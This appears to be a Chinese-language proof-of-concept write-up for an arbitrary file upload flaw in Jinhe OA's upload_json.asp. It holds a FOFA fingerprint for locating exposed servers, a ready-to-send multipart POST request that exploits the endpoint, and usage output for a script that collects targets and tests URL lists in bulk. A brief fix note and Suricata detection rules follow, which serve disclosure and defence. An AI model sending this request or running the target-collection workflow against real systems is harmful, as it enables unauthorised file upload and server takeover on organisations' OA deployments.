### 产品简介  
金和网络是专业信息化服务商，为城市监管部门提供了互联网+监管解决方案，为企事业单位提供组织协同OA系统升开发平台，电子政务一体化平台智慧电商平合等服务  

### 漏洞概述  
金和OA upload_json.asp存在任意文件上传漏洞，攻击者可通过此漏洞获取服务器权限。  

### 指纹识别  
fofa: app="金和网络-金和OA"  

![Image text](https://github.com/YUUKI4O4/POC/blob/main/%E9%87%91%E5%92%8C/Jinhe_OA_Arbitrary_File_Upload_Vulnerability/1.png)

### 漏洞利用  
```
poc:
POST /c6/KindEditor1/asp/upload_json.asp?dir=file HTTP/1.1
Host: your_ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Content-Length: 338
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------153857212076213662067051609723
 
-----------------------------153857212076213662067051609723
Content-Disposition: form-data; name="localUrl"
 
 
-----------------------------153857212076213662067051609723
Content-Disposition: form-data; name="imgFile"; filename="123.txt"
Content-Type: image/png
 
hello success
-----------------------------153857212076213662067051609723--
```

![Image text](https://github.com/YUUKI4O4/POC/blob/main/%E9%87%91%E5%92%8C/Jinhe_OA_Arbitrary_File_Upload_Vulnerability/3.png)  
![Image text](https://github.com/YUUKI4O4/POC/blob/main/%E9%87%91%E5%92%8C/Jinhe_OA_Arbitrary_File_Upload_Vulnerability/2.png)  

### 测试和利用脚本  
```
python3 Jinhe_OA_Arbitrary_File_Upload_Vulnerability.py -h                      
usage: Jinhe_OA_Arbitrary_File_Upload_Vulnerability.py [-h] [-t] [-r FILE] [-u URL]

### Jinhe OA upload_ Json.asp has an arbitrary file upload vulnerability. ###

options:
  -h, --help            show this help message and exit
  -t, --target_collection
                        Perform target collection
  -r FILE, --multi_objective_testing FILE
                        Perform multi-objective testing. e.g:python Jinhe_OA_Arbitrary_File_Upload_Vulnerability.py -r ./url.txt
  -u URL, --single_objective_testing URL
                        Perform single-objective testing. e.g:python Jinhe_OA_Arbitrary_File_Upload_Vulnerability.py -u http://xxx.xxx.xxx
```

### 修复建议  
1.联系相关软件厂商更新至最新安全版本。  

### Suricata rules  
```
alert http any any -> any any (msg:"Jinhe OA upload_ Json.asp has an arbitrary file upload vulnerability"; flow:established,to_server; flowbits:set,Jinhe_OA_Arbitrary_File_Upload_Vulnerability; content:"post";http_method;nocase; content:"/c6/KindEditor1/asp/upload_json.asp?dir=file";http_uri;fast_pattern;nocase; content:"Content-Type: multipart/form-data";nocase;http_header; content:"Content-Disposition: form-data\; name=";nocase;http_client_body; content:"filename=";nocase;http_client_body; pcre:"/filename=[^\.]+\.(txt|jsp|jspx|exe|asp|aspx)/Pi"; reference:url,https://github.com/YUUKI4O4/POC/tree/main/%E9%87%91%E5%92%8C/Jinhe_OA_Arbitrary_File_Upload_Vulnerability; classtype:web-attck; metadata:created_at 2024-01-08,updated_at 2024-01-08,creater:YUUKI4O4; sid:5; rev:1;)
alert http any any -> any any (msg:"Jinhe OA upload_ Json.asp has an arbitrary file upload vulnerability, successful"; flow:established,from_server; flowbits:isset,Jinhe_OA_Arbitrary_File_Upload_Vulnerability; content:"200";http_stat_code; content:"{";nocase;http_server_body;startswith; content:"error";nocase;http_server_body;distance:0; content:"url";nocase;http_server_body; reference:url,https://github.com/YUUKI4O4/POC/tree/main/%E9%87%91%E5%92%8C/Jinhe_OA_Arbitrary_File_Upload_Vulnerability; classtype:web-attck; metadata:created_at 2024-01-08,updated_at 2024-01-08,creater:YUUKI4O4; sid:6; rev:1;)
```
